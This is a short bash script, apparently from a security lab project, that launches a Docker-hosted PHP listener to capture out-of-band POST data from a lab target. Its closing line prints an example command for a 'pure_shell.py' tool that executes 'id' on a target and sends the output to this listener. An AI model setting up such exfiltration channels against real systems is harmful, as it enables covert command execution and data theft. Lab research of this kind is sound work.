#!/bin/bash
# Start a same-bridge OOB listener for the --oob mode.
#
# The listener is the stock php:8.4.26-apache image running PHP's built-in
# server. It captures POST bodies to ./oob-out/oob.txt, which the host can
# read directly. The target reaches it at the container IP on the default
# Docker bridge (same network as the lab target), so no host port forwarding
# or host-gateway assumptions are involved.
#
# usage:
#   ./experiments/run_oob_listener.sh
#   PORT=18999 ./experiments/run_oob_listener.sh
set -eu

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
OOB_NAME=${OOB_NAME:-p2s-oob}
PORT=${PORT:-18999}
IMAGE=${IMAGE:-php:8.4.26-apache}

if [ -n "${DOCKER:-}" ]; then
  :
elif docker info >/dev/null 2>&1; then
  DOCKER=docker
else
  DOCKER="sudo docker"
fi

$DOCKER rm -f "$OOB_NAME" >/dev/null 2>&1 || true
mkdir -p "$HERE/oob-out"
rm -f "$HERE/oob-out/oob.txt"

$DOCKER run -d --name "$OOB_NAME" \
  -v "$HERE/experiments/oob_listener.php:/listener.php:ro" \
  -v "$HERE/oob-out:/capture" \
  "$IMAGE" php -S "0.0.0.0:$PORT" /listener.php >/dev/null

IP=""
for _ in $(seq 1 40); do
  IP=$($DOCKER inspect -f \
    '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$OOB_NAME" 2>/dev/null || true)
  if [ -n "$IP" ]; then
    break
  fi
  sleep 0.25
done
if [ -z "$IP" ]; then
  echo "listener failed to start" >&2
  $DOCKER logs "$OOB_NAME" >&2 || true
  exit 1
fi

URL="http://$IP:$PORT/"
echo "listener: $OOB_NAME ($IP:$PORT)"
echo "url:      $URL"
echo "capture:  $HERE/oob-out/oob.txt"
echo
echo "tool: python3 pure_shell.py --oob '$URL' --exec 'id'"
